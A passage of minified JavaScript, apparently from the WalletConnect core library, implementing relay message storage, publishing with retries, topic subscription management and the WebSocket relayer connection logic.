c=this.getSymKey(i),u=a8({symKey:c,encoded:s,encoding:o==null?void 0:o.encoding});return Zo(u)}catch(c){this.logger.error(`Failed to decode message from topic: '${i}', clientId: '${await this.getClientId()}'`),this.logger.error(c)}}),Nr(this,"getPayloadType",(i,s=hi)=>{const o=Qu({encoded:i,encoding:s});return na(o.type)}),Nr(this,"getPayloadSenderPublicKey",(i,s=hi)=>{const o=Qu({encoded:i,encoding:s});return o.senderPublicKey?fn(o.senderPublicKey,Jr):void 0}),this.core=e,this.logger=Gr(r,this.name),this.keychain=n||new VB(this.core,this.logger)}get context(){return gn(this.logger)}async setPrivateKey(e,r){return await this.keychain.set(e,r),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get(hv)}catch{e=Fm(),await this.keychain.set(hv,e)}return HB(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var JB=Object.defineProperty,ZB=Object.defineProperties,XB=Object.getOwnPropertyDescriptors,vv=Object.getOwnPropertySymbols,eU=Object.prototype.hasOwnProperty,tU=Object.prototype.propertyIsEnumerable,Km=(t,e,r)=>e in t?JB(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,rU=(t,e)=>{for(var r in e||(e={}))eU.call(e,r)&&Km(t,r,e[r]);if(vv)for(var r of vv(e))tU.call(e,r)&&Km(t,r,e[r]);return t},nU=(t,e)=>ZB(t,XB(e)),vn=(t,e,r)=>Km(t,typeof e!="symbol"?e+"":e,r);class iU extends _T{constructor(e,r){super(e,r),this.logger=e,this.core=r,vn(this,"messages",new Map),vn(this,"messagesWithoutClientAck",new Map),vn(this,"name",QM),vn(this,"version",YM),vn(this,"initialized",!1),vn(this,"storagePrefix",Li),vn(this,"init",async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const n=await this.getRelayerMessages();typeof n<"u"&&(this.messages=n);const i=await this.getRelayerMessagesWithoutClientAck();typeof i<"u"&&(this.messagesWithoutClientAck=i),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(n){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(n)}finally{this.initialized=!0}}}),vn(this,"set",async(n,i,s)=>{this.isInitialized();const o=Oi(i);let a=this.messages.get(n);if(typeof a>"u"&&(a={}),typeof a[o]<"u")return o;if(a[o]=i,this.messages.set(n,a),s===cd.inbound){const c=this.messagesWithoutClientAck.get(n)||{};this.messagesWithoutClientAck.set(n,nU(rU({},c),{[o]:i}))}return await this.persist(),o}),vn(this,"get",n=>{this.isInitialized();let i=this.messages.get(n);return typeof i>"u"&&(i={}),i}),vn(this,"getWithoutAck",n=>{this.isInitialized();const i={};for(const s of n){const o=this.messagesWithoutClientAck.get(s)||{};i[s]=Object.values(o)}return i}),vn(this,"has",(n,i)=>{this.isInitialized();const s=this.get(n),o=Oi(i);return typeof s[o]<"u"}),vn(this,"ack",async(n,i)=>{this.isInitialized();const s=this.messagesWithoutClientAck.get(n);if(typeof s>"u")return;const o=Oi(i);delete s[o],Object.keys(s).length===0?this.messagesWithoutClientAck.delete(n):this.messagesWithoutClientAck.set(n,s),await this.persist()}),vn(this,"del",async n=>{this.isInitialized(),this.messages.delete(n),this.messagesWithoutClientAck.delete(n),await this.persist()}),this.logger=Gr(e,this.name),this.core=r}get context(){return gn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get storageKeyWithoutClientAck(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name+"_withoutClientAck"}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,Tm(e))}async setRelayerMessagesWithoutClientAck(e){await this.core.storage.setItem(this.storageKeyWithoutClientAck,Tm(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?Pm(e):void 0}async getRelayerMessagesWithoutClientAck(){const e=await this.core.storage.getItem(this.storageKeyWithoutClientAck);return typeof e<"u"?Pm(e):void 0}async persist(){await this.setRelayerMessages(this.messages),await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}}var sU=Object.defineProperty,oU=Object.defineProperties,aU=Object.getOwnPropertyDescriptors,Ev=Object.getOwnPropertySymbols,cU=Object.prototype.hasOwnProperty,uU=Object.prototype.propertyIsEnumerable,Qm=(t,e,r)=>e in t?sU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Mh=(t,e)=>{for(var r in e||(e={}))cU.call(e,r)&&Qm(t,r,e[r]);if(Ev)for(var r of Ev(e))uU.call(e,r)&&Qm(t,r,e[r]);return t},ag=(t,e)=>oU(t,aU(e)),ri=(t,e,r)=>Qm(t,typeof e!="symbol"?e+"":e,r);class lU extends CT{constructor(e,r){super(e,r),this.relayer=e,this.logger=r,ri(this,"events",new Vn.EventEmitter),ri(this,"name",JM),ri(this,"queue",new Map),ri(this,"publishTimeout",se.toMiliseconds(se.ONE_MINUTE)),ri(this,"initialPublishTimeout",se.toMiliseconds(se.ONE_SECOND*15)),ri(this,"needsTransportRestart",!1),ri(this,"publish",async(n,i,s)=>{var o;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:n,message:i,opts:s}});const a=(s==null?void 0:s.ttl)||dv,c=Dd(s),u=(s==null?void 0:s.prompt)||!1,l=(s==null?void 0:s.tag)||0,h=(s==null?void 0:s.id)||$o().toString(),d={topic:n,message:i,opts:{ttl:a,relay:c,prompt:u,tag:l,id:h,attestation:s==null?void 0:s.attestation,tvf:s==null?void 0:s.tvf}},g=`Failed to publish payload, please try again. id:${h} tag:${l}`;try{const y=new Promise(async m=>{const b=({id:_})=>{d.opts.id===_&&(this.removeRequestFromQueue(_),this.relayer.events.removeListener(vr.publish,b),m(d))};this.relayer.events.on(vr.publish,b);const A=Vs(new Promise((_,T)=>{this.rpcPublish({topic:n,message:i,ttl:a,prompt:u,tag:l,id:h,attestation:s==null?void 0:s.attestation,tvf:s==null?void 0:s.tvf}).then(_).catch(P=>{this.logger.warn(P,P==null?void 0:P.message),T(P)})}),this.initialPublishTimeout,`Failed initial publish, retrying.... id:${h} tag:${l}`);try{await A,this.events.removeListener(vr.publish,b)}catch(_){this.queue.set(h,ag(Mh({},d),{attempt:1})),this.logger.warn(_,_==null?void 0:_.message)}});this.logger.trace({type:"method",method:"publish",params:{id:h,topic:n,message:i,opts:s}}),await Vs(y,this.publishTimeout,g)}catch(y){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(y),(o=s==null?void 0:s.internal)!=null&&o.throwOnFailedPublish)throw y}finally{this.queue.delete(h)}}),ri(this,"on",(n,i)=>{this.events.on(n,i)}),ri(this,"once",(n,i)=>{this.events.once(n,i)}),ri(this,"off",(n,i)=>{this.events.off(n,i)}),ri(this,"removeListener",(n,i)=>{this.events.removeListener(n,i)}),this.relayer=e,this.logger=Gr(r,this.name),this.registerEventListeners()}get context(){return gn(this.logger)}async rpcPublish(e){var r,n,i,s;const{topic:o,message:a,ttl:c=dv,prompt:u,tag:l,id:h,attestation:d,tvf:g}=e,y={method:Eu(Dd().protocol).publish,params:Mh({topic:o,message:a,ttl:c,prompt:u,tag:l,attestation:d},g),id:h};Or((r=y.params)==null?void 0:r.prompt)&&((n=y.params)==null||delete n.prompt),Or((i=y.params)==null?void 0:i.tag)&&((s=y.params)==null||delete s.tag),this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:y});const m=await this.relayer.request(y);return this.relayer.events.emit(vr.publish,e),this.logger.debug("Successfully Published Payload"),m}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach(async(e,r)=>{const n=e.attempt+1;this.queue.set(r,ag(Mh({},e),{attempt:n}));const{topic:i,message:s,opts:o,attestation:a}=e;this.logger.warn({},`Publisher: queue->publishing: ${e.opts.id}, tag: ${e.opts.tag}, attempt: ${n}`),await this.rpcPublish(ag(Mh({},e),{topic:i,message:s,ttl:o.ttl,prompt:o.prompt,tag:o.tag,id:o.id,attestation:a,tvf:o.tvf})),this.logger.warn({},`Publisher: queue->published: ${e.opts.id}`)})}registerEventListeners(){this.relayer.core.heartbeat.on(kc.pulse,()=>{if(this.needsTransportRestart){this.needsTransportRestart=!1,this.relayer.events.emit(vr.connection_stalled);return}this.checkQueue()}),this.relayer.on(vr.message_ack,e=>{this.removeRequestFromQueue(e.id.toString())})}}var hU=Object.defineProperty,dU=(t,e,r)=>e in t?hU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Ta=(t,e,r)=>dU(t,typeof e!="symbol"?e+"":e,r);class fU{constructor(){Ta(this,"map",new Map),Ta(this,"set",(e,r)=>{const n=this.get(e);this.exists(e,r)||this.map.set(e,[...n,r])}),Ta(this,"get",e=>this.map.get(e)||[]),Ta(this,"exists",(e,r)=>this.get(e).includes(r)),Ta(this,"delete",(e,r)=>{if(typeof r>"u"){this.map.delete(e);return}if(!this.map.has(e))return;const n=this.get(e);if(!this.exists(e,r))return;const i=n.filter(s=>s!==r);if(!i.length){this.map.delete(e);return}this.map.set(e,i)}),Ta(this,"clear",()=>{this.map.clear()})}get topics(){return Array.from(this.map.keys())}}var pU=Object.defineProperty,gU=Object.defineProperties,mU=Object.getOwnPropertyDescriptors,Av=Object.getOwnPropertySymbols,yU=Object.prototype.hasOwnProperty,wU=Object.prototype.propertyIsEnumerable,Ym=(t,e,r)=>e in t?pU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,cu=(t,e)=>{for(var r in e||(e={}))yU.call(e,r)&&Ym(t,r,e[r]);if(Av)for(var r of Av(e))wU.call(e,r)&&Ym(t,r,e[r]);return t},cg=(t,e)=>gU(t,mU(e)),mt=(t,e,r)=>Ym(t,typeof e!="symbol"?e+"":e,r);class bU extends ST{constructor(e,r){super(e,r),this.relayer=e,this.logger=r,mt(this,"subscriptions",new Map),mt(this,"topicMap",new fU),mt(this,"events",new Vn.EventEmitter),mt(this,"name",i4),mt(this,"version",s4),mt(this,"pending",new Map),mt(this,"cached",[]),mt(this,"initialized",!1),mt(this,"storagePrefix",Li),mt(this,"subscribeTimeout",se.toMiliseconds(se.ONE_MINUTE)),mt(this,"initialSubscribeTimeout",se.toMiliseconds(se.ONE_SECOND*15)),mt(this,"clientId"),mt(this,"batchSubscribeTopicsLimit",500),mt(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),await this.restore()),this.initialized=!0}),mt(this,"subscribe",async(n,i)=>{this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:n,opts:i}});try{const s=Dd(i),o={topic:n,relay:s,transportType:i==null?void 0:i.transportType};this.pending.set(n,o);const a=await this.rpcSubscribe(n,s,i);return typeof a=="string"&&(this.onSubscribe(a,o),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:n,opts:i}})),a}catch(s){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(s),s}}),mt(this,"unsubscribe",async(n,i)=>{this.isInitialized(),typeof(i==null?void 0:i.id)<"u"?await this.unsubscribeById(n,i.id,i):await this.unsubscribeByTopic(n,i)}),mt(this,"isSubscribed",n=>new Promise(i=>{i(this.topicMap.topics.includes(n))})),mt(this,"isKnownTopic",n=>new Promise(i=>{i(this.topicMap.topics.includes(n)||this.pending.has(n)||this.cached.some(s=>s.topic===n))})),mt(this,"on",(n,i)=>{this.events.on(n,i)}),mt(this,"once",(n,i)=>{this.events.once(n,i)}),mt(this,"off",(n,i)=>{this.events.off(n,i)}),mt(this,"removeListener",(n,i)=>{this.events.removeListener(n,i)}),mt(this,"start",async()=>{await this.onConnect()}),mt(this,"stop",async()=>{await this.onDisconnect()}),mt(this,"restart",async()=>{await this.restore(),await this.onRestart()}),mt(this,"checkPending",async()=>{if(this.pending.size===0&&(!this.initialized||!this.relayer.connected))return;const n=[];this.pending.forEach(i=>{n.push(i)}),await this.batchSubscribe(n)}),mt(this,"registerEventListeners",()=>{this.relayer.core.heartbeat.on(kc.pulse,async()=>{await this.checkPending()}),this.events.on(An.created,async n=>{const i=An.created;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:n}),await this.persist()}),this.events.on(An.deleted,async n=>{const i=An.deleted;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:n}),await this.persist()})}),this.relayer=e,this.logger=Gr(r,this.name),this.clientId=""}get context(){return gn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}get hasAnyTopics(){return this.topicMap.topics.length>0||this.pending.size>0||this.cached.length>0||this.subscriptions.size>0}hasSubscription(e,r){let n=!1;try{n=this.getSubscription(e).topic===r}catch{}return n}reset(){this.cached=[],this.initialized=!0}onDisable(){this.cached=this.values,this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,r){const n=this.topicMap.get(e);await Promise.all(n.map(async i=>await this.unsubscribeById(e,i,r)))}async unsubscribeById(e,r,n){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:r,opts:n}});try{const i=Dd(n);await this.restartToComplete({topic:e,id:r,relay:i}),await this.rpcUnsubscribe(e,r,i);const s=ht("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,r,s),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:r,opts:n}})}catch(i){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(i),i}}async rpcSubscribe(e,r,n){var i;(!n||(n==null?void 0:n.transportType)===Wt.relay)&&await this.restartToComplete({topic:e,id:e,relay:r});const s={method:Eu(r.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:s});const o=(i=n==null?void 0:n.internal)==null?void 0:i.throwOnFailedPublish;try{const a=await this.getSubscriptionId(e);if((n==null?void 0:n.transportType)===Wt.link_mode)return setTimeout(()=>{(this.relayer.connected||this.relayer.connecting)&&this.relayer.request(s).catch(l=>this.logger.warn(l))},se.toMiliseconds(se.ONE_SECOND)),a;const c=new Promise(async l=>{const h=d=>{d.topic===e&&(this.events.removeListener(An.created,h),l(d.id))};this.events.on(An.created,h);try{const d=await Vs(new Promise((g,y)=>{this.relayer.request(s).catch(m=>{this.logger.warn(m,m==null?void 0:m.message),y(m)}).then(g)}),this.initialSubscribeTimeout,`Subscribing to ${e} failed, please try again`);this.events.removeListener(An.created,h),l(d)}catch{}}),u=await Vs(c,this.subscribeTimeout,`Subscribing to ${e} failed, please try again`);if(!u&&o)throw new Error(`Subscribing to ${e} failed, please try again`);return u?a:null}catch(a){if(this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(vr.connection_stalled),o)throw a}return null}async rpcBatchSubscribe(e){if(!e.length)return;const r=e[0].relay,n={method:Eu(r.protocol).batchSubscribe,params:{topics:e.map(i=>i.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:n});try{await await Vs(new Promise(i=>{this.relayer.request(n).catch(s=>this.logger.warn(s)).then(i)}),this.subscribeTimeout,"rpcBatchSubscribe failed, please try again")}catch{this.relayer.events.emit(vr.connection_stalled)}}async rpcBatchFetchMessages(e){if(!e.length)return;const r=e[0].relay,n={method:Eu(r.protocol).batchFetchMessages,params:{topics:e.map(s=>s.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:n});let i;try{i=await await Vs(new Promise((s,o)=>{this.relayer.request(n).catch(a=>{this.logger.warn(a),o(a)}).then(s)}),this.subscribeTimeout,"rpcBatchFetchMessages failed, please try again")}catch{this.relayer.events.emit(vr.connection_stalled)}return i}rpcUnsubscribe(e,r,n){const i={method:Eu(n.protocol).unsubscribe,params:{topic:e,id:r}};return this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i}),this.relayer.request(i)}onSubscribe(e,r){this.setSubscription(e,cg(cu({},r),{id:e})),this.pending.delete(r.topic)}onBatchSubscribe(e){e.length&&e.forEach(r=>{this.setSubscription(r.id,cu({},r)),this.pending.delete(r.topic)})}async onUnsubscribe(e,r,n){this.events.removeAllListeners(r),this.hasSubscription(r,e)&&this.deleteSubscription(r,n),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,r){this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:r}),this.addSubscription(e,r)}addSubscription(e,r){this.subscriptions.set(e,cu({},r)),this.topicMap.set(r.topic,e),this.events.emit(An.created,r)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const r=this.subscriptions.get(e);if(!r){const{message:n}=oe("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(n)}return r}deleteSubscription(e,r){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:r});const n=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(n.topic,e),this.events.emit(An.deleted,cg(cu({},n),{reason:r}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(An.sync)}async onRestart(){if(this.cached.length){const e=[...this.cached],r=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let n=0;n<r;n++){const i=e.splice(0,this.batchSubscribeTopicsLimit);await this.batchSubscribe(i)}}this.events.emit(An.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size){const{message:r}=oe("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(r),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(r)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){e.length&&(await this.rpcBatchSubscribe(e),this.onBatchSubscribe(await Promise.all(e.map(async r=>cg(cu({},r),{id:await this.getSubscriptionId(r.topic)})))))}async batchFetchMessages(e){if(!e.length)return;this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);const r=await this.rpcBatchFetchMessages(e);r&&r.messages&&(await WD(se.toMiliseconds(se.ONE_SECOND)),await this.relayer.handleBatchMessageEvents(r.messages))}async onConnect(){await this.restart(),this.reset()}onDisconnect(){this.onDisable()}isInitialized(){if(!this.initialized){const{message:e}=oe("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(e){!this.relayer.connected&&!this.relayer.connecting&&(this.cached.push(e),await this.relayer.transportOpen())}async getClientId(){return this.clientId||(this.clientId=await this.relayer.core.crypto.getClientId()),this.clientId}async getSubscriptionId(e){return Oi(e+await this.getClientId())}}var vU=Object.defineProperty,_v=Object.getOwnPropertySymbols,EU=Object.prototype.hasOwnProperty,AU=Object.prototype.propertyIsEnumerable,Jm=(t,e,r)=>e in t?vU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Cv=(t,e)=>{for(var r in e||(e={}))EU.call(e,r)&&Jm(t,r,e[r]);if(_v)for(var r of _v(e))AU.call(e,r)&&Jm(t,r,e[r]);return t},Ve=(t,e,r)=>Jm(t,typeof e!="symbol"?e+"":e,r);class _U extends IT{constructor(e){super(e),Ve(this,"protocol","wc"),Ve(this,"version",2),Ve(this,"core"),Ve(this,"logger"),Ve(this,"events",new Vn.EventEmitter),Ve(this,"provider"),Ve(this,"messages"),Ve(this,"subscriber"),Ve(this,"publisher"),Ve(this,"name",XM),Ve(this,"transportExplicitlyClosed",!1),Ve(this,"initialized",!1),Ve(this,"connectionAttemptInProgress",!1),Ve(this,"relayUrl"),Ve(this,"projectId"),Ve(this,"packageName"),Ve(this,"bundleId"),Ve(this,"hasExperiencedNetworkDisruption",!1),Ve(this,"pingTimeout"),Ve(this,"heartBeatTimeout",se.toMiliseconds(se.THIRTY_SECONDS+se.FIVE_SECONDS)),Ve(this,"reconnectTimeout"),Ve(this,"connectPromise"),Ve(this,"reconnectInProgress",!1),Ve(this,"requestsInFlight",[]),Ve(this,"connectTimeout",se.toMiliseconds(se.ONE_SECOND*15)),Ve(this,"request",async r=>{var n,i;this.logger.debug("Publishing Request Payload");const s=r.id||$o().toString();await this.toEstablishConnection();try{this.logger.trace({id:s,method:r.method,topic:(n=r.params)==null?void 0:n.topic},"relayer.request - publishing...");const o=`${s}:${((i=r.params)==null?void 0:i.tag)||""}`;this.requestsInFlight.push(o);const a=await this.provider.request(r);return this.requestsInFlight=this.requestsInFlight.filter(c=>c!==o),a}catch(o){throw this.logger.debug(`Failed to Publish Request: ${s}`),o}}),Ve(this,"resetPingTimeout",()=>{Od()&&(clearTimeout(this.pingTimeout),this.pingTimeout=setTimeout(()=>{var r,n,i,s;try{this.logger.debug({},"pingTimeout: Connection stalled, terminating..."),(s=(i=(n=(r=this.provider)==null?void 0:r.connection)==null?void 0:n.socket)==null?void 0:i.terminate)==null||s.call(i)}catch(o){this.logger.warn(o,o==null?void 0:o.message)}},this.heartBeatTimeout))}),Ve(this,"onPayloadHandler",r=>{this.onProviderPayload(r),this.resetPingTimeout()}),Ve(this,"onConnectHandler",()=>{this.logger.warn({},"Relayer connected "),this.startPingTimeout(),this.events.emit(vr.connect)}),Ve(this,"onDisconnectHandler",()=>{this.logger.warn({},"Relayer disconnected "),this.requestsInFlight=[],this.onProviderDisconnect()}),Ve(this,"onProviderErrorHandler",r=>{this.logger.fatal(`Fatal socket error: ${r.message}`),this.events.emit(vr.error,r),this.logger.fatal("Fatal socket error received, closing transport"),this.transportClose()}),Ve(this,"registerProviderListeners",()=>{this.provider.on(Mn.payload,this.onPayloadHandler),this.provider.on(Mn.connect,this.onConnectHandler),this.provider.on(Mn.disconnect,this.onDisconnectHandler),this.provider.on(Mn.error,this.onProviderErrorHandler)}),this.core=e.core,this.logger=typeof e.logger<"u"&&typeof e.logger!="string"?Gr(e.logger,this.name):Vl(Dc({level:e.logger||ZM})),this.messages=new iU(this.logger,e.core),this.subscriber=new bU(this,this.logger),this.publisher=new lU(this,this.logger),this.relayUrl=(e==null?void 0:e.relayUrl)||LC,this.projectId=e.projectId,TD()?this.packageName=yb():PD()&&(this.bundleId=yb()),this.provider={}}async init(){if(this.logger.trace("Initialized"),this.registerEventListeners(),await Promise.all([this.messages.init(),this.subscriber.init()]),this.initialized=!0,this.subscriber.hasAnyTopics)try{await this.transportOpen()}catch(e){this.logger.warn(e,e==null?void 0:e.message)}}get context(){return gn(this.logger)}get connected(){var e,r,n;return((n=(r=(e=this.provider)==null?void 0:e.connection)==null?void 0:r.socket)==null?void 0:n.readyState)===1||!1}get connecting(){var e,r,n;return((n=(r=(e=this.provider)==null?void 0:e.connection)==null?void 0:r.socket)==null?void 0:n.readyState)===0||this.connectPromise!==void 0||!1}async publish(e,r,n){this.isInitialized(),await this.publisher.publish(e,r,n),await this.recordMessageEvent({topic:e,message:r,publishedAt:Date.now(),transportType:Wt.relay},cd.outbound)}async subscribe(e,r){var n,i,s;this.isInitialized(),(!(r!=null&&r.transportType)||(r==null?void 0:r.transportType)==="relay")&&await this.toEstablishConnection();const o=typeof((n=r==null?void 0:r.internal)==null?void 0:n.throwOnFailedPublish)>"u"?!0:(i=r==null?void 0:r.internal)==null?void 0:i.throwOnFailedPublish;let a=((s=this.subscriber.topicMap.get(e))==null?void 0:s[0])||"",c;const u=l=>{l.topic===e&&(this.subscriber.off(An.created,u),c())};return await Promise.all([new Promise(l=>{c=l,this.subscriber.on(An.created,u)}),new Promise(async(l,h)=>{a=await this.subscriber.subscribe(e,Cv({internal:{throwOnFailedPublish:o}},r)).catch(d=>{o&&h(d)})||a,l()})]),a}async unsubscribe(e,r){this.isInitialized(),await this.subscriber.unsubscribe(e,r)}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async transportDisconnect(){this.provider.disconnect&&(this.hasExperiencedNetworkDisruption||this.connected)?await Vs(this.provider.disconnect(),2e3,"provider.disconnect()").catch(()=>this.onProviderDisconnect()):this.onProviderDisconnect()}async transportClose(){this.transportExplicitlyClosed=!0,await this.transportDisconnect()}async transportOpen(e){if(!this.subscriber.hasAnyTopics){this.logger.warn("Starting WS connection skipped because the client has no topics to work with.");return}if(this.connectPromise?(this.logger.debug({},"Waiting for existing connection attempt to resolve..."),await this.connectPromise,this.logger.debug({},"Existing connection attempt resolved")):(this.connectPromise=new Promise(async(r,n)=>{await this.connect(e).then(r).catch(n).finally(()=>{this.connectPromise=void 0})}),await this.connectPromise),!this.connected)throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)}async restartTransport(e){this.logger.debug({},"Restarting transport..."),!this.connectionAttemptInProgress&&(this.relayUrl=e||this.relayUrl,await this.confirmOnlineStateOrThrow(),await this.transportClose(),await this.transportOpen())}async confirmOnlineStateOrThrow(){if(!await rv())throw new Error("No internet connection detected. Please restart your network and try again.")}async handleBatchMessageEvents(e){if((e==null?void 0:e.length)===0){this.logger.trace("Batch message events is empty. Ignoring...");return}const r=e.sort((n,i)=>n.publishedAt-i.publishedAt);this.logger.debug(`Batch of ${r.length} message events sorted`);for(const n of r)try{await this.onMessageEvent(n)}catch(i){this.logger.warn(i,"Error while processing batch message event: "+(i==null?void 0:i.message))}this.logger.trace(`Batch of ${r.length} message events processed`)}async onLinkMessageEvent(e,r){const{topic:n}=e;if(!r.sessionExists){const i=lr(se.FIVE_MINUTES),s={topic:n,expiry:i,relay:{protocol:"irn"},active:!1};await this.core.pairing.pairings.set(n,s)}this.events.emit(vr.message,e),await this.recordMessageEvent(e,cd.inbound)}async connect(e){await this.confirmOnlineStateOrThrow(),e&&e!==this.relayUrl&&(this.relayUrl=e,await this.transportDisconnect()),this.connectionAttemptInProgress=!0,this.transportExplicitlyClosed=!1;let r=1;for(;r<6;){try{if(this.transportExplicitlyClosed)break;this.logger.debug({},`Connecting to ${this.relayUrl}, attempt: ${r}...`),await this.createProvider(),await new Promise(async(n,i)=>{const s=()=>{i(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(Mn.disconnect,s),await Vs(new Promise((o,a)=>{this.provider.connect().then(o).catch(a)}),this.connectTimeout,`Socket stalled when trying to connect to ${this.relayUrl}`).catch(o=>{i(o)}).finally(()=>{this.provider.off(Mn.disconnect,s),clearTimeout(this.reconnectTimeout)}),await new Promise(async(o,a)=>{const c=()=>{a(new Error("Connection interrupted while trying to subscribe"))};this.provider.once(Mn.disconnect,c),await this.subscriber.start().then(o).catch(a).finally(()=>{this.provider.off(Mn.disconnect,c)})}),this.hasExperiencedNetworkDisruption=!1,n()})}catch(n){await this.subscriber.stop();const i=n;this.logger.warn({},i.message),this.hasExperiencedNetworkDisruption=!0}finally{this.connectionAttemptInProgress=!1}if(this.connected){this.logger.debug({},`Connected to ${this.relayUrl} successfully on attempt: ${r}`);break}await new Promise(n=>setTimeout(n,se.toMiliseconds(r*1))),r++}}startPingTimeout(){var e,r,n,i,s;if(Od())try{(r=(e=this.provider)==null?void 0:e.connection)!=null&&r.socket&&((s=(i=(n=this.provider)==null?void 0:n.connection)==null?void 0:i.socket)==null||s.on("ping",()=>{this.resetPingTimeout()})),this.resetPingTimeout()}catch(o){this.logger.warn(o,o==null?void 0:o.message)}}async createProvider(){this.provider.connection&&this.unregisterProviderListeners();const e=await this.core.crypto.signJWT(this.relayUrl);this.provider=new Qn(new jM(MD({sdkVersion:Wm,protocol:this.protocol,version:this.version,relayUrl:this.relayUrl,projectId:this.projectId,auth:e,useOnCloseEvent:!0,bundleId:this.bundleId,packageName:this.packageName}))),this.registerProviderListeners()}async recordMessageEvent(e,r){const{topic:n,message:i}=e;await this.messages.set(n,i,r)}async shouldIgnoreMessageEvent(e){const{topic:r,message:n}=e;if(!n||n.length===0)return this.logger.warn(`Ignoring invalid/empty message: ${n}`),!0;if(!await this.subscriber.isKnownTopic(r))return this.logger.warn(`Ignoring message for unknown topic ${r}`),!0;const i=this.messages.has(r,n);return i&&this.logger.warn(`Ignoring duplicate message: ${n}`),i}async onProviderPayload(e){if(this.logger.debug("Incoming Relay Payload"),this.logger.trace({type:"payload",direction:"incoming",payload:e}),ly(e)){if(!e.method.endsWith(e4))return;const r=e.params,{topic:n,message:i,publishedAt:s,attestation:o}=r.data,a={topic:n,message:i,publishedAt:s,transportType:Wt.relay,attestation:o};this.logger.debug("Emitting Relayer Payload"),this.logger.trace(Cv({type:"event",event:r.id},a)),this.events.emit(r.id,a),await this.acknowledgePayload(e),await this.onMessageEvent(a)}else Mf(e)&&this.events.emit(vr.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(await this.recordMessageEvent(e,cd.inbound),this.events.emit(vr.message,e))}async acknowledgePayload(e){const r=kf(e.id,!0);await 